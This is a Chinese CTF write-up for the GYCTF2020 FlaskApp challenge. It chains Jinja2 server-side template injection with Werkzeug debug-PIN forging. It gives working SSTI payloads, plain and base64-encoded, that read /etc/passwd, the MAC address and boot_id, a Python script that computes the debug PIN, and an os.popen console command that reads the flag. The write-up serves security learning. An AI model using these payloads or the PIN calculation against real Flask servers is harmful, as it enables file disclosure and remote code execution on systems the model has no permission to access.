---
title: '[GYCTF2020]FlaskApp 1题解-flask模板ssti注入+pin码破解'
abbrlink: 4d166b76
categories: 
  - ctf题解/web
date: 2026-05-14 22:24:15
---# [GYCTF2020]FlaskApp 1题解-flask模板ssti注入+pin码破解

## 0x01 知识点储备： 

### 1.CSRF跨站请求伪造

**CSRF**（Cross-Site Request  Forgery，跨站请求伪造）是一种网络攻击形式，攻击者通过伪造用户的请求，利用用户已登录的身份在受信任的网站上执行未授权的操作。此类攻击通常发生在用户登录后，攻击者诱导用户访问恶意链接或页面，从而在用户不知情的情况下执行敏感操作

### 2.Flask 的 PIN 码了解

在开发 Flask 应用时，如果开启了 `debug=True` 模式，一旦程序运行出错，浏览器就会显示一个详细的报错页面（Traceback）。

为了方便开发者调试，这个页面提供了一个**交互式控制台（Interactive Console）**，能直接在浏览器里输入 Python 代码。

为了有人利用这个控制台远程控制服务器，Flask 的底层工具库 **Werkzeug** 就设计了 PIN 码。

--

[#](https://xz.aliyun.com/news/15462)以下引用内容来源于这篇文章，大家可以看看

>pin码主要由六个参数构成
>
>**probably_public_bits**：
>
>1. username：执行代码时的用户名,读/etc/passwd这个文件，然后猜UID：1000以上一般为人为创建
>2. appname：`getattr(app, "__name__", app.__class__.__name__)`，固定值，默认是 `Flask`
>3. modname：`getattr(app, "module", t.cast(object, app).class.module)`，获取固定值，默认是 `flask.app`
>4. moddir：`getattr(mod, "__file__", None)`，即 `app.py` 文件所在路径，一般可以通过查看debug报错信息获得
>
>**private_bits**：
>
>1. uuid：`str(uuid.getnode())`，即电脑上的 MAC 地址，也可以通过读取 `/sys/class/net/eth0/address` 获取，一般得到的是一串十六进制数，将其中的横杠去掉然后转成十进制，例如：`00:16:3e:03:8f:39` \=> `95529701177`
>
>2. machine_id：`get_machine_id()`，首先读取 `/etc/machine-id`，如果有值则不读取 `/proc/sys/kernel/random/boot_id`(一般docker用这个)。
>
>   接着读取 `/proc/self/cgroup`，取第一行的最后一个斜杠 `/` 后面的所有字符串，与上面读到的值拼接起来，最后得到 `machine_id`。

等会会发现这道题目不用拼接，为什么？因为Werkzeug 版本的差异

Werkzeug 的 PIN 码生成算法：（知识点5有关于Werkzeug的介绍）

- **在较旧的版本中**：代码逻辑非常简单，只要读到了 `/etc/machine-id` 或者 `/proc/sys/kernel/random/boot_id` 其中的任何一个，不再去读** `cgroup`。

- **在较新的版本中**：为了解决 Docker 容器经常共享宿主机 `machine-id` 导致 PIN 重复的问题，官方增加了一层逻辑：不管有没有读到前面的 ID，都**必须**去读取 `/proc/self/cgroup` 并把那一长串 Docker ID 拼上去。

  

### 3.linux以文件形式查看mac地址方法

查看/sys/class/net/目录下的接口信息：cat /sys/class/net/<interface_name>/address 

将<interface_name>替换为你的网络接口名称（如eth0）。

示例：

cat /sys/class/net/eth0/address

### 4.什么是Python Builtins？

[#](https://deepinout.com/python/python-qa/979_python_whats_the_difference_between___builtin___and___builtins__.html)以下引用内容来源于文章

>**builtin**是一个模块对象，它包含了Python内置的函数、异常和其他对象。
>
>它提供了许多常用的函数和对象，可以直接在代码中使用，而无需显式导入。
>
>例如，可以直接使用print()、len()等函数，这些函数实际上是**builtin**模块中的对象。
>
>--
>
>**builtins**是一个字典对象，它包含了Python解释器中所有内置的名称和对应的对象。
>
>这个字典可以作为全局变量在任何地方使用。
>
>它类似于一个命名空间，用于存储解释器中所有可用的内置函数和属性。可以通过全局命名空间来访问和使用这些内置的功能。
>
>



### 5.什么是werkzeug？

以下图片来源于知乎

![image-20260422172454160](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260422172454344.png)

---

## 0x02 思路

抓包看到了csrf_token跨站请求伪造令牌，说明后端开启了安全校验

![image-20260422160540271](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260422160547522.png)

查看提示页面/hint源代码，发现pin

![image-20260422174945435](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260422174945549.png)

随便输入发现报错debug模式

![image-20260422164631190](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260422164631317.png)

页末显示了werkzeug库，可以联想到和debug的关系

![image-20260422173253494](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260422173253589.png)

同时报错页面存在我们破解pin所需要的绝对路径: /usr/local/lib/python3.7/site-packages/flask/app.py

只剩下了Username，MAC，Machine ID

怎么找？利用模板注入，因为在刚刚报错的时候暴露了漏洞位置。在解码时把解码后的字符串放进了模板里面渲染render，我们可以利用

```
return render_template_string(decoded_query)
```



---



## 0x03 exp

#### 1.payload1 尝试注入并拿到用户名 flaskweb

```
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
```

##### 步骤：

1.先把payload编码，利用解码时的漏洞，解码后的输出就是我们想要的答案

![image-20260422164525896](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260422164526028.png)



```
结果 ： root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flaskweb:x:1000:1000::/home/flaskweb:/bin/sh 
```

现在还剩下 MAC 地址 和 machine ID



#### 2.payload2 拿到 MAC 地址（/sys/class/net/）

```
原：
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/sys/class/net/eth0/address').read()}}
base64编码后：
e3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvc3lzL2NsYXNzL25ldC9ldGgwL2FkZHJlc3MnKS5yZWFkKCl9fQ==
回显：
22:c5:bc:54:c1:74 
16进制转十进制：
38232663572852
```

![image-20260422180158429](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260422180158513.png)

#### 3.payload3 拿到 machine ID（/etc/machine-id）

```
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/proc/sys/kernel/random/boot_id').read()}}
回显：
1408f836b0ca514d796cbf8960e45fa1 
```



#### 4.脚本计算pin

```
Username: flaskweb

modname: flask.app  (默认值)

App Name: Flask  (默认值)

绝对路径: /usr/local/lib/python3.7/site-packages/flask/app.py  (报错界面已显示)

MAC 地址: 22:c5:bc:54:c1:74 

Machine ID: 1408f836b0ca514d796cbf8960e45fa1 
```

脚本来源于pin解说的那篇文章

```
import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.7/site-packages/flask/app.py',
]

private_bits = [
    '38232663572852',
    '1408f836b0ca514d796cbf8960e45fa1'
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

得到pin码

![image-20260422170928743](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260422170928831.png)



#### 4.进入交互模式，拿flag

点击图中小小的黑窗表示即可进入控制台

![image-20260422171101528](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260422171101635.png)

输入pin码

![image-20260422171048119](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260422171048211.png)

在我们可以输入命令之前，我们需要用到python的`import os`导入模块调用系统底层命令

![image-20260422171324545](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260422171324691.png)

拿到flag

```
>>> os.popen('cat /this_is_the_flag.txt').read()
'flag{bb333216-a89c-4b39-be2b-edc8a63d26b6}\n'
```

